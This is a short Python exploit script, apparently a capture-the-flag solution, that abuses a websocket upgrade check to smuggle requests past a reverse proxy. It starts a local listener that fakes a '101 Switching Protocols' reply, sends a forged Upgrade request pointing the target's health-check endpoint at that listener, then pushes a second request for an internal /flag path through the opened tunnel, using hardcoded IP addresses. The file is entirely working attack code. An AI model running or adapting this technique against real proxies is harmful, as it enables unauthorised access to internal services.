import threading
import socket
import ssl

HOST = '31.22.122.203'
PORT = 8443
MSERVER = '140.113.24.143:1339'

def run_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 1339))
    s.listen()
    conn, addr = s.accept()
    print(f"{addr} connected")
    conn.sendall(b"HTTP/1.1 101 Switching Protocols\r\n\r\n")

def send_request(sock, content):
    sock.sendall(content.encode())
    data = b""
    while b'\r\n\r\n' not in data:
        data += sock.recv(4096)
    return data

def exploit():
    fakeUpgrade = ("GET /_meta/api/check?hostname=%s HTTP/1.1\r\n" % MSERVER +
            "Host: secret.frontline.cloud.flu.xxx\r\n" +
            "Connection: Keep-Alive\r\n" +
            "Upgrade: websocket\r\n"+
            "Cache-Control: no-cache\r\n" +
            "Content-Length: 0\r\n\r\n")
    payload = ("GET /flag HTTP/1.1\r\n" +
            "Host: secret.frontline.cloud.flu.xxx\r\n" +
            "Connection: Keep-Alive\r\n" +
            "Cache-Control: no-cache\r\n" +
            "Authorization: supersecretauthtoken:)\r\n" +
            "Content-Length: 0\r\n\r\n")

    sslContext = ssl.create_default_context()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = sslContext.wrap_socket(s, server_hostname="public.frontline.cloud.flu.xxx")
    sock.connect((HOST, PORT))

    print(send_request(sock, fakeUpgrade))
    print(send_request(sock, payload))



def main():
    thread = threading.Thread(target = run_server)
    thread.deamon = True
    thread.start()
    exploit()
    
if __name__ == '__main__':
    main()